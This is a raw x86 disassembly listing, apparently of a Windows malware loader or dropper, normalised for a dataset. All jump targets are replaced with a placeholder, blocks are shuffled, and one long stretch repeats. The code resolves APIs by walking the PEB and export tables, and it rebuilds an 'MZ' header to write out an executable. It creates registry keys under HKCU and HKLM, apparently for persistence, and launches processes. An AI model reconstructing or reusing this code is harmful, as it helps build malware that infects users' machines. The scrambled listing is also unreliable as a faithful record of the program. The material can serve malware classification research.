mov [ ebp - 0x558 ] eax
push 0x0
push 0x80
push 0x2
push 0x0
push 0x1
push 0x40000000
lea ecx [ ebp - 0x120 ]
push ecx
call [ ebp - 0x418 ]
mov [ ebp - 0x558 ] eax
jmp rwxdata
mov ecx [ ebp - 0x130 ]
add ecx 0x1
mov [ ebp - 0x130 ] ecx
mov edx [ ebp - 0x148 ]
add edx 0x1
mov [ ebp - 0x148 ] edx
mov [ ebp - 0x2ac ] 0x0
jmp rwxdata
mov [ ebp - 0x130 ] 0x0
jmp rwxdata
jmp rwxdata
jmp rwxdata
mov eax [ ebp - 0x148 ]
mov [ eax ] 0x5a
mov ecx [ ebp - 0x148 ]
sub ecx 0x1
mov [ ebp - 0x148 ] ecx
mov edx [ ebp - 0x148 ]
mov [ edx ] 0x4d
push 0x0
lea eax [ ebp - 0x550 ]
push eax
mov ecx [ ebp - 0x288 ]
push ecx
mov edx [ ebp - 0x148 ]
push edx
mov eax [ ebp - 0x558 ]
push eax
call [ ebp - 0x28c ]
mov ecx [ ebp - 0x558 ]
push ecx
call [ ebp - 0x13c ]
mov edx [ ebp - 0x144 ]
and edx 0x100
je rwxdata
cmp [ ebp - 0x558 ] 0xffffffff
je rwxdata
mov ecx [ ebp - 0x2ac ]
movsx edx [ ebp + ecx - 0x530 ]
test edx edx
je rwxdata
mov ecx [ ebp - 0x130 ]
movsx edx [ ebp + ecx - 0x410 ]
cmp edx 0x2f
je rwxdata
mov eax [ ebp - 0x130 ]
add eax 0x1
mov [ ebp - 0x130 ] eax
mov [ ebp - 0x574 ] 0x44
mov eax [ ebp - 0x18 ]
cmp eax [ ebp - 0x290 ]
jae rwxdata
jmp rwxdata
mov edx [ ebp - 0x130 ]
movsx eax [ ebp + edx - 0x410 ]
cmp eax 0x2f
jne rwxdata
mov eax [ ebp - 0x130 ]
movsx ecx [ ebp + eax - 0x410 ]
test ecx ecx
je rwxdata
mov [ ebp - 0x300 ] 0x44
mov [ ebp - 0x2d4 ] 0x81
mov edx [ ebp - 0x144 ]
and edx 0x1000
je rwxdata
mov eax [ ebp - 0x574 ]
sub eax 0x1
mov [ ebp - 0x574 ] eax
mov ecx [ ebp - 0x574 ]
mov [ ebp + ecx - 0x300 ] 0x0
jmp rwxdata
mov edx [ ebp - 0x138 ]
push edx
call [ ebp - 0x534 ]
mov ecx [ ebp - 0x2ac ]
push ecx
lea edx [ ebp - 0x530 ]
push edx
push 0x1
push 0x0
lea eax [ ebp - 0x260 ]
push eax
mov ecx [ ebp - 0x138 ]
push ecx
call [ ebp - 0x268 ]
mov [ ebp - 0x2b4 ] eax
mov eax [ ebp - 0x2ac ]
add eax 0x1
mov [ ebp - 0x2ac ] eax
mov ecx [ ebp - 0x130 ]
add ecx 0x1
mov [ ebp - 0x130 ] ecx
jmp rwxdata
jmp rwxdata
mov ecx 0x5
mov [ ebp - 0x2d0 ] cx
xor eax eax
mov [ ebp - 0x2d0 ] ax
jmp rwxdata
cmp [ ebp - 0x574 ] 0x0
je rwxdata
mov eax [ ebp - 0x130 ]
movsx ecx [ ebp + eax - 0x410 ]
test ecx ecx
je rwxdata
mov eax [ ebp - 0x130 ]
add eax 0x1
mov [ ebp - 0x130 ] eax
lea edx [ ebp - 0x278 ]
push edx
lea eax [ ebp - 0x300 ]
push eax
push 0x0
push 0x0
push 0x20
push 0x0
push 0x0
push 0x0
lea ecx [ ebp - 0x120 ]
push ecx
push 0x0
call [ ebp - 0x55c ]
mov edx [ ebp - 0x18 ]
imul edx edx 0xa
mov eax [ ebp - 0x130 ]
movsx ecx [ ebp + eax - 0x410 ]
lea edx [ edx + ecx - 0x30 ]
mov [ ebp - 0x18 ] edx
jmp rwxdata
mov edx [ ebp - 0x130 ]
add edx 0x1
mov [ ebp - 0x130 ] edx
sub_72a27d
nop
pop [ ebp - 0x12c ]
mov eax [ ebp - 0x12c ]
sub eax 0x24c
mov [ ebp - 0x284 ] eax
mov [ ebp - 0x540 ] 0x0
mov [ ebp - 0x2a8 ] 0x0
mov [ ebp - 0x420 ] 0x0
mov [ ebp - 0x144 ] 0x0
mov ecx [ ebp - 0x284 ]
mov edx [ ecx ]
mov [ ebp - 0x420 ] edx
mov eax [ ebp - 0x284 ]
add eax 0x4
mov [ ebp - 0x140 ] eax
mov ecx [ ebp - 0x140 ]
push ecx
call sub_72afe0
add esp 0x4
call sub_72b110
mov [ ebp - 0x54c ] eax
mov edx [ ebp - 0x140 ]
push edx
mov eax [ ebp - 0x54c ]
push eax
call sub_72b140
add esp 0x8
mov [ ebp - 0x540 ] eax
mov ecx [ ebp - 0x284 ]
mov edx [ ecx + 0x1c ]
mov [ ebp - 0x144 ] edx
mov [ ebp - 0x548 ] 0x0
mov [ ebp - 0x53c ] 0x0
mov eax [ ebp - 0x284 ]
add eax 0xa0
mov [ ebp - 0x2a4 ] eax
mov ecx [ ebp - 0x284 ]
add ecx 0x1f0
mov [ ebp - 0x14 ] ecx
mov edx [ ebp - 0x284 ]
add edx 0xd0
mov [ ebp - 0x128 ] edx
mov [ ebp - 0x124 ] 0x0
mov [ ebp - 0x150 ] 0x0
mov eax [ ebp - 0x12c ]
sub eax 0x1
mov [ ebp - 0x12c ] eax
mov ecx [ ebp - 0x12c ]
mov edx [ ecx ]
mov [ ebp - 0x154 ] edx
jmp rwxdata
mov [ ebp - 0x2a0 ] 0x0
mov [ ebp - 0x41c ] 0x0
mov [ ebp - 0x418 ] 0x0
mov [ ebp - 0x13c ] 0x0
mov [ ebp - 0x14c ] 0x0
mov [ ebp - 0x29c ] 0x0
mov [ ebp - 0x538 ] 0x0
mov [ ebp - 0x544 ] 0x0
mov [ ebp - 0x280 ] 0x0
mov [ ebp - 0x28c ] 0x0
mov [ ebp - 0x55c ] 0x0
mov [ ebp - 0x8 ] 0x0
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x534 ] 0x0
mov [ ebp - 0x268 ] 0x0
mov [ ebp - 0x414 ] 0x0
mov [ ebp - 0x298 ] 0x0
mov edx [ ebp - 0x284 ]
add edx 0x1f0
mov [ ebp - 0x124 ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax ]
mov [ ebp - 0x2a0 ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x4 ]
mov [ ebp - 0x41c ] eax
mov ecx [ ebp - 0x124 ]
mov edx [ ecx + 0x8 ]
mov [ ebp - 0x418 ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax + 0xc ]
mov [ ebp - 0x13c ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x10 ]
mov [ ebp - 0x14c ] eax
mov ecx [ ebp - 0x124 ]
mov edx [ ecx + 0x14 ]
mov [ ebp - 0x29c ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax + 0x18 ]
mov [ ebp - 0x538 ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x1c ]
mov [ ebp - 0x544 ] eax
mov ecx [ ebp - 0x124 ]
mov edx [ ecx + 0x20 ]
mov [ ebp - 0x280 ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax + 0x24 ]
mov [ ebp - 0x28c ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x28 ]
mov [ ebp - 0x55c ] eax
mov ecx [ ebp - 0x124 ]
mov edx [ ecx + 0x2c ]
mov [ ebp - 0x8 ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax + 0x30 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x34 ]
mov [ ebp - 0x534 ] eax
mov ecx [ ebp - 0x124 ]
mov edx [ ecx + 0x38 ]
mov [ ebp - 0x268 ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax + 0x3c ]
mov [ ebp - 0x414 ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x40 ]
mov [ ebp - 0x298 ] eax
mov [ ebp - 0x264 ] 0x0
mov ecx [ ebp - 0x284 ]
add ecx 0x20
mov [ ebp - 0x264 ] ecx
mov [ ebp - 0x2b4 ] 0x0
mov [ ebp - 0x18 ] 0x0
push 0x103
lea edx [ ebp - 0x120 ]
push edx
push 0x0
call [ ebp - 0x41c ]
push 0x0
push 0x0
push 0x3
push 0x0
push 0x1
push 0x80000000
lea eax [ ebp - 0x120 ]
push eax
call [ ebp - 0x418 ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0xffffffff
je rwxdata
mov eax [ ebp - 0x548 ]
push eax
call [ ebp - 0x540 ]
mov [ ebp - 0x150 ] eax
cmp [ ebp - 0x150 ] 0x0
jne rwxdata
cmp [ ebp - 0x154 ] 0x652a5e26
je rwxdata
call [ ebp - 0x420 ]
xor eax eax
mov esp ebp
pop ebp
retn
push 0x0
mov ecx [ ebp - 0xc ]
push ecx
call [ ebp - 0x14c ]
mov [ ebp - 0x288 ] eax
cmp [ ebp - 0x288 ] 0xc800000
ja rwxdata
mov ecx [ ebp - 0x128 ]
mov [ ebp - 0x53c ] ecx
mov edx [ ebp - 0x53c ]
movsx eax [ edx ]
test eax eax
je rwxdata
jmp rwxdata
mov eax [ ebp - 0xc ]
push eax
call [ ebp - 0x13c ]
push 0x4
push 0x1000
mov edx [ ebp - 0x288 ]
push edx
push 0x0
call [ ebp - 0x29c ]
mov [ ebp - 0x294 ] eax
cmp [ ebp - 0x294 ] 0x0
je rwxdata
mov edx [ ebp - 0x128 ]
add edx 0x5
mov [ ebp - 0x128 ] edx
mov eax [ ebp - 0x548 ]
mov [ ebp - 0x570 ] eax
mov [ ebp - 0x56c ] 0x0
mov ecx [ ebp - 0x53c ]
push ecx
mov edx [ ebp - 0x150 ]
push edx
call sub_72b140
add esp 0x8
mov [ ebp - 0x124 ] eax
mov [ ebp - 0x560 ] 0x4
push 0x0
lea eax [ ebp - 0x550 ]
push eax
mov ecx [ ebp - 0x288 ]
push ecx
mov edx [ ebp - 0x294 ]
push edx
mov eax [ ebp - 0xc ]
push eax
call [ ebp - 0x544 ]
mov ecx [ ebp - 0x550 ]
mov edx [ ebp - 0x294 ]
lea eax [ edx + ecx - 0x3 ]
mov [ ebp - 0x148 ] eax
jmp rwxdata
mov edx [ ebp - 0x56c ]
mov eax [ ebp - 0x2a4 ]
lea ecx [ eax + edx + 0x1 ]
mov [ ebp - 0x2a4 ] ecx
jmp rwxdata
mov ecx [ ebp - 0x570 ]
movsx edx [ ecx ]
mov eax [ ebp - 0x570 ]
add eax 0x1
mov [ ebp - 0x570 ] eax
test edx edx
je rwxdata
mov edx [ ebp - 0x14 ]
add edx 0x4
mov [ ebp - 0x14 ] edx
mov eax [ ebp - 0x53c ]
mov [ ebp - 0x568 ] eax
mov [ ebp - 0x564 ] 0x0
mov edx [ ebp - 0x14 ]
add edx [ ebp - 0x560 ]
mov eax [ ebp - 0x560 ]
mov cl [ ebp + eax - 0x124 ]
mov [ edx ] cl
jmp rwxdata
mov edx [ ebp - 0x148 ]
cmp edx [ ebp - 0x294 ]
jbe rwxdata
mov eax [ ebp - 0x2a4 ]
mov [ ebp - 0x548 ] eax
mov ecx [ ebp - 0x548 ]
movsx edx [ ecx ]
test edx edx
je rwxdata
mov ecx [ ebp - 0x56c ]
add ecx 0x1
mov [ ebp - 0x56c ] ecx
jmp rwxdata
mov edx [ ebp - 0x564 ]
mov eax [ ebp - 0x128 ]
lea ecx [ eax + edx + 0x1 ]
mov [ ebp - 0x128 ] ecx
jmp rwxdata
mov ecx [ ebp - 0x568 ]
movsx edx [ ecx ]
mov eax [ ebp - 0x568 ]
add eax 0x1
mov [ ebp - 0x568 ] eax
test edx edx
je rwxdata
mov eax [ ebp - 0x560 ]
mov ecx [ ebp - 0x560 ]
sub ecx 0x1
mov [ ebp - 0x560 ] ecx
test eax eax
je rwxdata
mov eax [ ebp - 0x148 ]
cmp eax [ ebp - 0x294 ]
jbe rwxdata
mov eax [ ebp - 0x148 ]
movsx ecx [ eax ]
cmp ecx 0x39
jne rwxdata
cmp [ ebp - 0x570 ] 0x0
je rwxdata
mov ecx [ ebp - 0x564 ]
add ecx 0x1
mov [ ebp - 0x564 ] ecx
jmp rwxdata
push 0x8000
push 0x0
mov edx [ ebp - 0x294 ]
push edx
call [ ebp - 0x538 ]
mov ecx [ ebp - 0x148 ]
add ecx 0x4
mov [ ebp - 0x148 ] ecx
mov [ ebp - 0x130 ] 0x0
jmp rwxdata
jmp rwxdata
mov edx [ ebp - 0x148 ]
movsx eax [ edx + 0x1 ]
cmp eax 0x23
jne rwxdata
cmp [ ebp - 0x568 ] 0x0
je rwxdata
mov ecx [ ebp - 0x148 ]
movsx edx [ ecx ]
cmp edx 0x3b
je rwxdata
mov ecx [ ebp - 0x148 ]
sub ecx 0x1
mov [ ebp - 0x148 ] ecx
mov ecx [ ebp - 0x148 ]
movsx edx [ ecx + 0x2 ]
cmp edx 0x37
jne rwxdata
mov edx [ ebp - 0x130 ]
sub edx 0x1
mov [ ebp - 0x554 ] edx
jmp rwxdata
mov eax [ ebp - 0x130 ]
mov ecx [ ebp - 0x148 ]
mov dl [ ecx ]
mov [ ebp + eax - 0x120 ] dl
mov eax [ ebp - 0x148 ]
movsx ecx [ eax ]
cmp ecx 0x2e
jne rwxdata
jmp rwxdata
mov ecx [ ebp - 0x554 ]
movsx edx [ ebp + ecx - 0x120 ]
cmp edx 0x2e
je rwxdata
jmp rwxdata
mov [ ebp - 0x554 ] 0x0
jmp rwxdata
mov [ ebp - 0x2b0 ] 0x0
mov eax [ ebp - 0x554 ]
add eax 0x1
mov [ ebp - 0x554 ] eax
jmp rwxdata
jmp rwxdata
mov edx [ ebp - 0x130 ]
add edx 0x1
mov [ ebp - 0x130 ] edx
mov eax [ ebp - 0x148 ]
add eax 0x1
mov [ ebp - 0x148 ] eax
mov eax [ ebp - 0x554 ]
cmp eax [ ebp - 0x130 ]
jae rwxdata
mov eax [ ebp - 0x554 ]
cmp eax [ ebp - 0x130 ]
jae rwxdata
mov eax [ ebp - 0x554 ]
sub eax 0x1
mov [ ebp - 0x554 ] eax
mov ecx [ ebp - 0x554 ]
mov [ ebp + ecx - 0x260 ] 0x0
lea edx [ ebp - 0x260 ]
push edx
call sub_72afe0
add esp 0x4
push 0x104
lea eax [ ebp - 0x260 ]
push eax
call [ ebp - 0x8 ]
push 0x0
lea ecx [ ebp - 0x260 ]
push ecx
call [ ebp - 0x280 ]
mov ecx [ ebp - 0x554 ]
mov edx [ ebp - 0x554 ]
mov al [ ebp + edx - 0x120 ]
mov [ ebp + ecx - 0x260 ] al
jmp rwxdata
mov ecx [ ebp - 0x2b0 ]
mov [ ebp + ecx - 0x260 ] 0x0
mov edx [ ebp - 0x130 ]
mov [ ebp + edx - 0x120 ] 0x0
lea eax [ ebp - 0x120 ]
push eax
call sub_72afe0
add esp 0x4
lea ecx [ ebp - 0x260 ]
push ecx
call sub_72afe0
add esp 0x4
push 0x104
lea edx [ ebp - 0x120 ]
push edx
call [ ebp - 0x8 ]
mov eax [ ebp - 0x148 ]
add eax 0x1
mov [ ebp - 0x148 ] eax
mov [ ebp - 0x130 ] 0x0
jmp rwxdata
mov ecx [ ebp - 0x2b0 ]
mov edx [ ebp - 0x554 ]
mov al [ ebp + edx - 0x120 ]
mov [ ebp + ecx - 0x260 ] al
jmp rwxdata
mov edx [ ebp - 0x554 ]
add edx 0x1
mov [ ebp - 0x554 ] edx
mov edx [ ebp - 0x130 ]
movsx eax [ ebp + edx - 0x120 ]
test eax eax
je rwxdata
mov ecx [ ebp - 0x554 ]
add ecx 0x1
mov [ ebp - 0x554 ] ecx
mov edx [ ebp - 0x2b0 ]
add edx 0x1
mov [ ebp - 0x2b0 ] edx
mov ecx [ ebp - 0x130 ]
mov [ ebp + ecx - 0x530 ] 0x20
mov edx [ ebp - 0x130 ]
add edx 0x1
mov [ ebp - 0x130 ] edx
mov eax [ ebp - 0x130 ]
mov [ ebp + eax - 0x530 ] 0x2f
mov ecx [ ebp - 0x130 ]
add ecx 0x1
mov [ ebp - 0x130 ] ecx
mov [ ebp - 0x290 ] 0x0
jmp rwxdata
mov ecx [ ebp - 0x130 ]
mov edx [ ebp - 0x130 ]
mov al [ ebp + edx - 0x120 ]
mov [ ebp + ecx - 0x530 ] al
jmp rwxdata
mov eax [ ebp - 0x148 ]
movsx ecx [ eax ]
cmp ecx 0x3b
je rwxdata
mov ecx [ ebp - 0x130 ]
add ecx 0x1
mov [ ebp - 0x130 ] ecx
mov ecx [ ebp - 0x130 ]
mov [ ebp + ecx - 0x530 ] 0x0
mov edx [ ebp - 0x148 ]
add edx 0x1
mov [ ebp - 0x148 ] edx
mov eax [ ebp - 0x264 ]
push eax
call sub_72afe0
add esp 0x4
mov ecx [ ebp - 0x144 ]
and ecx 0x1
je rwxdata
mov edx [ ebp - 0x290 ]
imul edx edx 0xa
mov eax [ ebp - 0x148 ]
movsx ecx [ eax ]
lea edx [ edx + ecx - 0x30 ]
mov [ ebp - 0x290 ] edx
mov eax [ ebp - 0x130 ]
mov ecx [ ebp - 0x148 ]
mov dl [ ecx ]
mov [ ebp + eax - 0x530 ] dl
mov eax [ ebp - 0x130 ]
add eax 0x1
mov [ ebp - 0x130 ] eax
jmp rwxdata
mov eax [ ebp - 0x18 ]
cmp eax [ ebp - 0x290 ]
jae rwxdata
mov edx [ ebp - 0x144 ]
and edx 0x10
je rwxdata
mov edx [ ebp - 0x148 ]
add edx 0x1
mov [ ebp - 0x148 ] edx
mov eax [ ebp - 0x18 ]
cmp eax [ ebp - 0x290 ]
ja rwxdata
mov ecx [ ebp - 0x264 ]
add ecx 0x30
push ecx
call sub_72afe0
add esp 0x4
lea edx [ ebp - 0x27c ]
push edx
lea eax [ ebp - 0x138 ]
push eax
push 0x0
push 0xf003f
push 0x0
push 0x0
push 0x0
mov ecx [ ebp - 0x264 ]
add ecx 0x30
push ecx
push 0x80000001
call [ ebp - 0x4 ]
mov [ ebp - 0x2b4 ] eax
cmp [ ebp - 0x2b4 ] 0x0
jne rwxdata
lea eax [ ebp - 0x27c ]
push eax
lea ecx [ ebp - 0x138 ]
push ecx
push 0x0
push 0xf003f
push 0x0
push 0x0
push 0x0
mov edx [ ebp - 0x264 ]
push edx
push 0x80000001
call [ ebp - 0x4 ]
mov [ ebp - 0x2b4 ] eax
lea eax [ ebp - 0x27c ]
push eax
lea ecx [ ebp - 0x138 ]
push ecx
push 0x0
push 0xf003f
push 0x0
push 0x0
push 0x0
mov edx [ ebp - 0x264 ]
push edx
push 0x80000002
call [ ebp - 0x4 ]
mov [ ebp - 0x2b4 ] eax
jmp rwxdata
mov [ ebp - 0x130 ] 0x0
mov [ ebp - 0x288 ] 0x0
jmp rwxdata
mov edx [ ebp - 0x264 ]
add edx 0x70
push edx
call sub_72afe0
add esp 0x4
mov eax [ ebp - 0x264 ]
add eax 0x70
push eax
mov ecx [ ebp - 0x138 ]
push ecx
call [ ebp - 0x298 ]
mov [ ebp - 0x2b4 ] eax
mov edx [ ebp - 0x138 ]
push edx
call [ ebp - 0x534 ]
mov [ ebp - 0x130 ] 0x0
jmp rwxdata
cmp [ ebp - 0x2b4 ] 0x0
jne rwxdata
mov eax [ ebp - 0x148 ]
movsx ecx [ eax ]
cmp ecx 0x3b
je rwxdata
cmp [ ebp - 0x130 ] 0xa
jae rwxdata
mov eax [ ebp - 0x18 ]
cmp eax [ ebp - 0x290 ]
jae rwxdata
mov edx [ ebp - 0x288 ]
imul edx edx 0xa
mov eax [ ebp - 0x148 ]
movsx ecx [ eax ]
lea edx [ edx + ecx - 0x30 ]
mov [ ebp - 0x288 ] edx
jmp rwxdata
cmp [ ebp - 0x2b4 ] 0x0
jne rwxdata
lea ecx [ ebp - 0x134 ]
push ecx
lea edx [ ebp - 0x410 ]
push edx
lea eax [ ebp - 0x10 ]
push eax
push 0x0
lea ecx [ ebp - 0x260 ]
push ecx
mov edx [ ebp - 0x138 ]
push edx
call [ ebp - 0x414 ]
mov [ ebp - 0x2b4 ] eax
cmp [ ebp - 0x2b4 ] 0x0
jne rwxdata
push 0x0
push 0x80
push 0x1
push 0x0
push 0x1
push 0x40000000
lea edx [ ebp - 0x120 ]
push edx
call [ ebp - 0x418 ]
mov [ ebp - 0x558 ] eax
push 0x0
push 0x80
push 0x2
push 0x0
push 0x1
push 0x40000000
lea ecx [ ebp - 0x120 ]
push ecx
call [ ebp - 0x418 ]
mov [ ebp - 0x558 ] eax
jmp rwxdata
mov ecx [ ebp - 0x130 ]
add ecx 0x1
mov [ ebp - 0x130 ] ecx
mov edx [ ebp - 0x148 ]
add edx 0x1
mov [ ebp - 0x148 ] edx
mov [ ebp - 0x2ac ] 0x0
jmp rwxdata
mov [ ebp - 0x130 ] 0x0
jmp rwxdata
jmp rwxdata
jmp rwxdata
mov eax [ ebp - 0x148 ]
mov [ eax ] 0x5a
mov ecx [ ebp - 0x148 ]
sub ecx 0x1
mov [ ebp - 0x148 ] ecx
mov edx [ ebp - 0x148 ]
mov [ edx ] 0x4d
push 0x0
lea eax [ ebp - 0x550 ]
push eax
mov ecx [ ebp - 0x288 ]
push ecx
mov edx [ ebp - 0x148 ]
push edx
mov eax [ ebp - 0x558 ]
push eax
call [ ebp - 0x28c ]
mov ecx [ ebp - 0x558 ]
push ecx
call [ ebp - 0x13c ]
mov edx [ ebp - 0x144 ]
and edx 0x100
je rwxdata
cmp [ ebp - 0x558 ] 0xffffffff
je rwxdata
mov ecx [ ebp - 0x2ac ]
movsx edx [ ebp + ecx - 0x530 ]
test edx edx
je rwxdata
mov ecx [ ebp - 0x130 ]
movsx edx [ ebp + ecx - 0x410 ]
cmp edx 0x2f
je rwxdata
mov eax [ ebp - 0x130 ]
add eax 0x1
mov [ ebp - 0x130 ] eax
mov [ ebp - 0x574 ] 0x44
mov eax [ ebp - 0x18 ]
cmp eax [ ebp - 0x290 ]
jae rwxdata
jmp rwxdata
mov edx [ ebp - 0x130 ]
movsx eax [ ebp + edx - 0x410 ]
cmp eax 0x2f
jne rwxdata
mov eax [ ebp - 0x130 ]
movsx ecx [ ebp + eax - 0x410 ]
test ecx ecx
je rwxdata
mov [ ebp - 0x300 ] 0x44
mov [ ebp - 0x2d4 ] 0x81
mov edx [ ebp - 0x144 ]
and edx 0x1000
je rwxdata
mov eax [ ebp - 0x574 ]
sub eax 0x1
mov [ ebp - 0x574 ] eax
mov ecx [ ebp - 0x574 ]
mov [ ebp + ecx - 0x300 ] 0x0
jmp rwxdata
mov edx [ ebp - 0x138 ]
push edx
call [ ebp - 0x534 ]
mov ecx [ ebp - 0x2ac ]
push ecx
lea edx [ ebp - 0x530 ]
push edx
push 0x1
push 0x0
lea eax [ ebp - 0x260 ]
push eax
mov ecx [ ebp - 0x138 ]
push ecx
call [ ebp - 0x268 ]
mov [ ebp - 0x2b4 ] eax
mov eax [ ebp - 0x2ac ]
add eax 0x1
mov [ ebp - 0x2ac ] eax
mov ecx [ ebp - 0x130 ]
add ecx 0x1
mov [ ebp - 0x130 ] ecx
jmp rwxdata
jmp rwxdata
mov ecx 0x5
mov [ ebp - 0x2d0 ] cx
xor eax eax
mov [ ebp - 0x2d0 ] ax
jmp rwxdata
cmp [ ebp - 0x574 ] 0x0
je rwxdata
mov eax [ ebp - 0x130 ]
movsx ecx [ ebp + eax - 0x410 ]
test ecx ecx
je rwxdata
mov eax [ ebp - 0x130 ]
add eax 0x1
mov [ ebp - 0x130 ] eax
lea edx [ ebp - 0x278 ]
push edx
lea eax [ ebp - 0x300 ]
push eax
push 0x0
push 0x0
push 0x20
push 0x0
push 0x0
push 0x0
lea ecx [ ebp - 0x120 ]
push ecx
push 0x0
call [ ebp - 0x55c ]
mov edx [ ebp - 0x18 ]
imul edx edx 0xa
mov eax [ ebp - 0x130 ]
movsx ecx [ ebp + eax - 0x410 ]
lea edx [ edx + ecx - 0x30 ]
mov [ ebp - 0x18 ] edx
jmp rwxdata
mov edx [ ebp - 0x130 ]
add edx 0x1
mov [ ebp - 0x130 ] edx
sub_72afe0
push ebp
mov ebp esp
sub esp 0x24
mov [ ebp - 0x14 ] 0x1
mov [ ebp - 0x13 ] 0x1
mov [ ebp - 0x12 ] 0x2
mov [ ebp - 0x11 ] 0x10
mov [ ebp - 0x10 ] 0x4
mov [ ebp - 0xf ] 0x4
mov [ ebp - 0xe ] 0x8
mov [ ebp - 0xd ] 0x8
mov [ ebp - 0xc ] 0x10
mov [ ebp - 0xb ] 0x2
mov [ ebp - 0xa ] 0x20
mov [ ebp - 0x9 ] 0x40
mov [ ebp - 0x8 ] 0x40
mov [ ebp - 0x7 ] 0x20
mov [ ebp - 0x6 ] 0x80
mov [ ebp - 0x5 ] 0x80
mov [ ebp - 0x4 ] 0x0
jmp rwxdata
mov ecx [ ebp + 0x8 ]
add ecx [ ebp - 0x4 ]
movsx edx [ ecx ]
test edx edx
je rwxdata
mov [ ebp - 0x1c ] 0x0
jmp rwxdata
jmp rwxdata
mov ecx [ ebp - 0x1c ]
cmp ecx [ ebp - 0x4 ]
jge rwxdata
mov eax [ ebp - 0x4 ]
add eax 0x1
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x4 ]
sub ecx 0x1
mov [ ebp - 0x4 ] ecx
jmp rwxdata
mov [ ebp - 0x15 ] 0x0
mov [ ebp - 0x20 ] 0x0
jmp rwxdata
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0x4 ]
movsx ecx [ eax ]
cmp ecx 0x20
jne rwxdata
cmp [ ebp - 0x20 ] 0x8
jge rwxdata
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x4 ]
mov [ edx + 0x1 ] 0x0
mov esp ebp
pop ebp
retn
cmp [ ebp - 0x4 ] 0x0
jle rwxdata
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x1c ]
mov al [ ebp - 0x15 ]
mov [ edx ] al
jmp rwxdata
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0x1c ]
movsx ecx [ eax ]
mov edx [ ebp - 0x20 ]
movzx eax [ ebp + edx * 2 - 0x14 ]
and ecx eax
je rwxdata
jmp rwxdata
mov eax [ ebp - 0x1c ]
add eax 0x1
mov [ ebp - 0x1c ] eax
movzx ecx [ ebp - 0x15 ]
mov edx [ ebp - 0x20 ]
movzx eax [ ebp + edx * 2 - 0x13 ]
not eax
and ecx eax
mov [ ebp - 0x24 ] ecx
movzx ecx [ ebp - 0x15 ]
mov edx [ ebp - 0x20 ]
movzx eax [ ebp + edx * 2 - 0x13 ]
or ecx eax
mov [ ebp - 0x24 ] ecx
jmp rwxdata
mov edx [ ebp - 0x4 ]
sub edx 0x1
mov [ ebp - 0x4 ] edx
mov edx [ ebp - 0x20 ]
add edx 0x1
mov [ ebp - 0x20 ] edx
mov cl [ ebp - 0x24 ]
mov [ ebp - 0x15 ] cl
jmp rwxdata
sub_72b110
push ebp
mov ebp esp
push ecx
mov eax [ fs : 0x30 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0xc ]
mov eax [ eax ]
mov eax [ eax ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_72b140
push ebp
mov ebp esp
sub esp 0x30
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov ecx [ ebp - 0x10 ]
mov [ ebp - 0x14 ] ecx
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x10 ]
add eax [ edx + 0x3c ]
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x10 ]
add edx [ ecx + 0x78 ]
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] 0x0
jmp rwxdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
cmp edx [ ecx + 0x18 ]
jae rwxdata
xor eax eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x20 ]
add ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov eax [ ecx + edx * 4 ]
add eax [ ebp - 0x10 ]
mov [ ebp - 0x18 ] eax
mov ecx [ ebp - 0x18 ]
mov [ ebp - 0x20 ] ecx
mov edx [ ebp + 0xc ]
mov [ ebp - 0x24 ] edx
sbb eax eax
sbb eax 0xffffffff
mov [ ebp - 0x2c ] eax
cmp [ ebp - 0x25 ] 0x0
je rwxdata
jmp rwxdata
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x24 ]
add eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x8 ]
mov dx [ eax + ecx * 2 ]
mov [ ebp - 0x1c ] dx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x1c ]
add ecx [ ebp - 0x10 ]
movzx edx [ ebp - 0x1c ]
mov eax [ ecx + edx * 4 ]
add eax [ ebp - 0x10 ]
jmp rwxdata
mov [ ebp - 0x2c ] 0x0
jmp rwxdata
mov eax [ ebp - 0x24 ]
mov cl [ eax + 0x1 ]
mov [ ebp - 0x26 ] cl
mov edx [ ebp - 0x20 ]
cmp cl [ edx + 0x1 ]
jne rwxdata
mov eax [ ebp - 0x8 ]
add eax 0x1
mov [ ebp - 0x8 ] eax
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x2c ]
mov [ ebp - 0x30 ] ecx
cmp [ ebp - 0x30 ] 0x0
jne rwxdata
add [ ebp - 0x24 ] 0x2
add [ ebp - 0x20 ] 0x2
cmp [ ebp - 0x26 ] 0x0
jne rwxdata
mov eax [ ebp - 0x24 ]
mov cl [ eax ]
mov [ ebp - 0x25 ] cl
mov edx [ ebp - 0x20 ]
cmp cl [ edx ]
jne rwxdata
sub_401070
push esi
mov esi ecx
call sub_401090
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
